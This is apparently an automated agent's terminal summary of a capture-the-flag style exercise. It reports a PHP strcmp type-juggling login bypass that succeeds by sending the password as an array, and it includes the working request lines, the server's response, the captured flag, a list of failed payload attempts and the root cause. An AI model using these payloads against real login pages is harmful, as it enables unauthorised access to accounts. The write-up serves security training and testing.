[32m│[0m ## Summary                                                                   [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **SUCCESSFUL PHP TYPE JUGGLING AUTHENTICATION BYPASS** ✅                    [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### Vulnerability Confirmed: Array Manipulation Bypass                       [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m The PHP application is vulnerable to **PHP type juggling via array           [32m│[0m
[32m│[0m manipulation**. By passing an array instead of a string for the password     [32m│[0m
[32m│[0m parameter, the `strcmp()` function fails and returns `NULL`, which evaluates [32m│[0m
[32m│[0m to `false` in loose comparison, bypassing the authentication check.          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### Successful Payloads                                                      [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Payload 1 & 2 (BOTH SUCCESSFUL):**                                         [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m GET /index.php?username=admin&password[]= HTTP/1.1                           [32m│[0m
[32m│[0m GET /index.php?username=admin&password[]=anything HTTP/1.1                   [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Response:**                                                                [32m│[0m
[32m│[0m - Status: HTTP 200 OK                                                        [32m│[0m
[32m│[0m - PHP Warning: `strcmp() expects parameter 1 to be string, array given in    [32m│[0m
[32m│[0m /var/www/html/index.php on line 71`                                          [32m│[0m
[32m│[0m - Success Message: `Welcome Admin`                                           [32m│[0m
[32m│[0m - **FLAG FOUND:**                                                            [32m│[0m
[32m│[0m `FLAG{3c8d37d2b7349c6124d67400ab817bed508eb3a155f2a0a1699732b1c120d86e}`     [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### Failed Payloads                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m The following payloads did NOT bypass authentication:                        [32m│[0m
[32m│[0m - `username[]=admin&password[]=` - Both parameters as arrays (returned "not  [32m│[0m
[32m│[0m the admin" message)                                                          [32m│[0m
[32m│[0m - `password=true` - Boolean bypass attempt                                   [32m│[0m
[32m│[0m - `password=1` - Integer bypass attempt                                      [32m│[0m
[32m│[0m - `password=%00` - Null byte injection                                       [32m│[0m
[32m│[0m - `username=admin%00` - Null byte in username                                [32m│[0m
[32m│[0m - `password=0` - Type coercion with zero                                     [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### Root Cause                                                               [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m The PHP code uses `strcmp()` to compare passwords. When an array is passed   [32m│[0m
[32m│[0m as the password parameter instead of a string, `strcmp()` returns `NULL`     [32m│[0m
[32m│[0m (with a warning), and due to PHP's loose comparison (`==`), `NULL == 0`      [32m│[0m
[32m│[0m evaluates to `true`, granting access.                                        [32m│[0m
[32m│[0m                                                                              [32m│[0m
